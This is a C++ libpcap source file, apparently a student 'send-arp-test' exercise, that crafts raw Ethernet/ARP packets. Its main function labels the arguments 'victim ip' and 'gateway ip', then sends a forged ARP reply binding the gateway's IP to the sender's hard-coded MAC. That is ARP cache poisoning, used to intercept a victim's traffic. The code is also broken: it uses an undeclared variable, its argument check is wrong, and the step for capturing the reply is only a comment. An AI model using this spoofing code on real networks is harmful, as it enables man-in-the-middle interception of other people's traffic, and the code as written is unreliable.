#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

int send_arp_packet(int type, char* dev, char* eth_dmac, char* eth_smac, char* arp_smac, char* arp_sip, char* arp_tmac, char* arp_tip) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(eth_dmac);
    packet.eth_.smac_ = Mac(eth_smac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    if(type == 1)
        packet.arp_.op_ = htons(ArpHdr::Request);
    else if (type==2)
        packet.arp_.op_ = htons(ArpHdr::Reply);
    else{
        printf("worng type error : [1]Request [2]Reply \n");
        return 1;
    }
    packet.arp_.smac_ = Mac(arp_smac);
    packet.arp_.sip_ = htonl(Ip(arp_sip));
    packet.arp_.tmac_ = Mac(arp_tmac);
    packet.arp_.tip_ = htonl(Ip(arp_tip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle);
}

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip> ... \n");
    printf("sample: send-arp-test wlan0 192.168.~.~ 192.168.~.~ \n");
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
		usage();
		return -1;
	}

    // Take argv
	char* dev = argv[1];
    char* sender_ip = argv[2]; //victim ip
    char* target_ip = argv[3]; //gateway ip
    char* what_mac = "ff:ff:ff:ff:ff:ff";
    char* tmac = "00:00:00:00:00:00";
    char* my_mac = "00:0c:29:cd:d7:89";
    char* my_ip = "192.168.0.7";

    send_arp_packet(1, dev, what_mac, my_mac, my_mac, my_ip, tmac, sender_ip);
    // accept arp reply packet
    send_arp_packet(2, dev, sender_mac, my_mac, my_mac, target_ip, sender_mac, sender_ip);


}
